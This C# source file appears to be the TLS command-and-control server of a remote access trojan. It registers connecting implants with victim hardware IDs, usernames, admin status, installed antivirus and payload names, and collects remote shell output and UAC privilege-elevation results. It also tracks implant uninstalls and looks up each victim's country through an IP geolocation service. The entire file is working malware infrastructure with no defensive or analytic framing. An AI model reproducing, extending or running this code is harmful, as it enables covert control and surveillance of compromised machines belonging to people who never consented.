using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using Newtonsoft.Json;
using SeroServer.Data;
using SeroServer.Protocol;

namespace SeroServer.Net;

public class TlsServer
{
    private TcpListener? _listener;
    private X509Certificate2? _cert;
    private CancellationTokenSource? _cts;
    private readonly DataStore _store;
    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(5) };
    private readonly ConcurrentDictionary<string, (string country, string code)> _countryCache = new();
    private readonly SemaphoreSlim _geoLock = new(1, 1);
    public int MaxConnectedClients { get; set; } = 1000;

    public string AuthKey { get; set; } = string.Empty;
    public Func<string>? GetClientIdPrefix { get; set; }
    public ConcurrentDictionary<string, ConnectedClient> ConnectedClients { get; } = new();
    public event Action<ConnectedClient>? ClientConnected;
    public event Action<ConnectedClient>? ClientDisconnected;
    public event Action<string, string>? ShellOutputReceived;
    public event Action<string, ElevationResultData>? ElevationResultReceived;
    public event Action<string>? OnLog;

    public bool IsRunning { get; private set; }

    public TlsServer(DataStore store) => _store = store;

    public void Start(int port)
    {
        if (IsRunning) return;

        _cert = CertificateHelper.GetOrCreateCertificate();
        _cts = new CancellationTokenSource();
        _listener = new TcpListener(IPAddress.Any, port);
        _listener.Start();
        IsRunning = true;

        Log($"TLS Server started on port {port}");
        _ = AcceptLoop(_cts.Token);
    }

    public void Stop()
    {
        if (!IsRunning) return;
        _cts?.Cancel();
        _listener?.Stop();
        IsRunning = false;

        foreach (var client in ConnectedClients.Values)
        {
            try { client.Cts.Cancel(); client.Stream?.Close(); } catch { }
        }
        ConnectedClients.Clear();
        Log("Server stopped.");
    }

    public async Task SendToClient(string clientId, Packet packet)
    {
        if (ConnectedClients.TryGetValue(clientId, out var client) && client.Stream != null)
        {
            await client.WriteLock.WaitAsync();
            try { await Packet.WriteToStreamAsync(client.Stream, packet); }
            catch { DisconnectClient(clientId); }
            finally { client.WriteLock.Release(); }
        }
    }

    public async Task SendToAll(Packet packet)
    {
        foreach (var id in ConnectedClients.Keys.ToList())
            await SendToClient(id, packet);
    }

    public void DisconnectClient(string clientId)
    {
        if (ConnectedClients.TryRemove(clientId, out var client))
        {
            try { client.Cts.Cancel(); client.Stream?.Close(); } catch { }
            _store.RecordDisconnection(client.Hwid);
            Log($"Client {client.Id} ({client.Username}@{client.IP}) disconnected.");
            ClientDisconnected?.Invoke(client);
        }
    }

    // ── Private ─────────────────────────────────────

    private async Task AcceptLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var tcp = await _listener!.AcceptTcpClientAsync(ct);
                _ = HandleClient(tcp, ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex) { Log($"Accept error: {ex.Message}"); }
        }
    }

    private async Task HandleClient(TcpClient tcp, CancellationToken serverCt)
    {
        var ep = tcp.Client.RemoteEndPoint as IPEndPoint;
        var ip = ep?.Address.ToString() ?? "?";
        ConnectedClient? client = null;

        // Max clients check
        if (ConnectedClients.Count >= MaxConnectedClients)
        {
            Log($"[LIMIT] Rejected {ip} (max {MaxConnectedClients} clients reached).");
            tcp.Close();
            return;
        }

        SslStream? sslStream = null;
        try
        {
            sslStream = new SslStream(tcp.GetStream(), false);
            await sslStream.AuthenticateAsServerAsync(_cert!);

            // Wait for ClientInfo packet
            var infoPacket = await Packet.ReadFromStreamAsync(sslStream, serverCt);
            if (infoPacket == null || infoPacket.Type != PacketType.ClientInfo)
            {
                Log($"Client {ip} sent invalid handshake (expected ClientInfo, got {infoPacket?.Type}).");
                tcp.Close();
                return;
            }

            var info = JsonConvert.DeserializeObject<ClientInfoData>(infoPacket.Data);
            if (info == null)
            {
                Log($"Client {ip} sent malformed ClientInfo JSON.");
                tcp.Close();
                return;
            }

            // Auth key verification (always required)
            if (string.IsNullOrEmpty(info.AuthKey) || info.AuthKey != AuthKey)
            {
                Log($"[AUTH] Rejected {ip}: invalid auth key.");
                tcp.Close();
                return;
            }

            // Use prefix embedded in client binary, fallback to server setting
            var prefix = !string.IsNullOrEmpty(info.IdPrefix)
                ? info.IdPrefix
                : GetClientIdPrefix?.Invoke() ?? "";
            var clientId = string.IsNullOrEmpty(prefix)
                ? Guid.NewGuid().ToString("N")[..8]
                : $"{prefix}-{Guid.NewGuid().ToString("N")[..8]}";

            client = new ConnectedClient
            {
                Id = clientId,
                Hwid = info.Hwid,
                InstanceId = info.InstanceId,
                Username = info.Username,
                IP = ip,
                OS = info.OS,
                MachineName = info.MachineName,
                IsAdmin = info.IsAdmin,
                Payload = info.Payload,
                Antivirus = info.Antivirus,
                Stream = sslStream,
            };

            // Resolve country from IP
            var (country, countryCode) = await ResolveCountryAsync(ip);
            client.Country = country;
            client.CountryCode = countryCode;

            // Restore tag + first seen from persistent record
            var record = _store.RecordConnection(client);
            client.Tag = record.Tag;
            client.FirstSeen = record.FirstSeen;

            // Only disconnect stale connection if it has the same InstanceId (reconnect)
            // Different InstanceId = multi-instance mode is active, allow both
            var stale = ConnectedClients.Values.FirstOrDefault(c =>
                c.Hwid == client.Hwid && c.InstanceId == client.InstanceId);
            if (stale != null)
            {
                Log($"Client {stale.Id} replaced by {client.Id} (reconnection).");
                DisconnectClient(stale.Id);
            }

            ConnectedClients[client.Id] = client;
            Log($"Client {client.Id} connected ({info.Username}@{ip}, {client.Country})");
            ClientConnected?.Invoke(client);

            // Read loop
            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(serverCt, client.Cts.Token);
            while (!linkedCts.Token.IsCancellationRequested)
            {
                var packet = await Packet.ReadFromStreamAsync(sslStream, linkedCts.Token);
                if (packet == null) break;

                switch (packet.Type)
                {
                    case PacketType.Heartbeat:
                        client.LastHeartbeat = DateTime.UtcNow;
                        await client.WriteLock.WaitAsync(linkedCts.Token);
                        try
                        {
                            await Packet.WriteToStreamAsync(sslStream, new Packet { Type = PacketType.HeartbeatAck }, linkedCts.Token);
                            client.PingSentAt = DateTime.UtcNow;
                            await Packet.WriteToStreamAsync(sslStream, new Packet
                            {
                                Type = PacketType.Ping,
                                Data = client.PingSentAt.Ticks.ToString()
                            }, linkedCts.Token);
                        }
                        finally { client.WriteLock.Release(); }
                        break;

                    case PacketType.Pong:
                        if (long.TryParse(packet.Data, out long ticks))
                        {
                            var rtt = DateTime.UtcNow - new DateTime(ticks, DateTimeKind.Utc);
                            client.PingMs = (int)rtt.TotalMilliseconds;
                        }
                        break;

                    case PacketType.ClientInfo:
                        var updated = JsonConvert.DeserializeObject<ClientInfoData>(packet.Data);
                        if (updated != null)
                        {
                            client.OS = updated.OS;
                            client.MachineName = updated.MachineName;
                            client.IsAdmin = updated.IsAdmin;
                            if (!string.IsNullOrEmpty(updated.Payload))
                                client.Payload = updated.Payload;
                        }
                        break;

                    case PacketType.ShellOutput:
                        var shellData = JsonConvert.DeserializeObject<ShellOutputData>(packet.Data);
                        if (shellData != null)
                        {
                            _store.RecordActivity(client.Hwid, $"Shell output (exit={shellData.ExitCode})");
                            ShellOutputReceived?.Invoke(client.Id, shellData.Output);
                        }
                        break;

                    case PacketType.ElevationResult:
                        var elevData = JsonConvert.DeserializeObject<ElevationResultData>(packet.Data);
                        if (elevData != null)
                        {
                            _store.RecordActivity(client.Hwid, $"Elevation: {(elevData.Success ? "OK" : "FAILED")} - {elevData.Message}");
                            Log($"[UAC] {client.Id}: {(elevData.Success ? "Elevated" : "Failed")} - {elevData.Message}");
                            ElevationResultReceived?.Invoke(client.Id, elevData);
                        }
                        break;

                    default:
                        Log($"Client {client.Id} sent unknown packet: {packet.Type}");
                        break;
                }
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            if (client is { PendingUninstall: true })
                Log($"[+] Client {client.Id} ({client.Username}@{ip}) uninstalled successfully.");
            else
                Log($"Client {ip} error: {ex.Message}");
        }
        finally
        {
            try { sslStream?.Close(); } catch { }
            tcp.Close();
            if (client != null) DisconnectClient(client.Id);
        }
    }

    private async Task<(string country, string code)> ResolveCountryAsync(string ip)
    {
        bool isLocal = string.IsNullOrEmpty(ip) || ip == "127.0.0.1" || ip == "::1" ||
            ip.StartsWith("192.168.") || ip.StartsWith("10.") || ip.StartsWith("172.");

        var lookupKey = isLocal ? "_public_" : ip;

        if (_countryCache.TryGetValue(lookupKey, out var cached))
            return cached;

        try
        {
            await _geoLock.WaitAsync();
            try
            {
                if (_countryCache.TryGetValue(lookupKey, out var cached2))
                    return cached2;

                var url = isLocal
                    ? "http://ip-api.com/json/?fields=country,countryCode"
                    : $"http://ip-api.com/json/{ip}?fields=country,countryCode";
                var json = await _http.GetStringAsync(url);
                var obj = JsonConvert.DeserializeObject<dynamic>(json);
                var country = (string?)obj?.country ?? "Unknown";
                var code = (string?)obj?.countryCode ?? "";
                var result = (country, code);
                _countryCache[lookupKey] = result;
                return result;
            }
            finally { _geoLock.Release(); }
        }
        catch
        {
            return (isLocal ? "Local" : "Unknown", "");
        }
    }

    private void Log(string msg)
    {
        _store.Log(msg);
        OnLog?.Invoke(msg);
    }
}
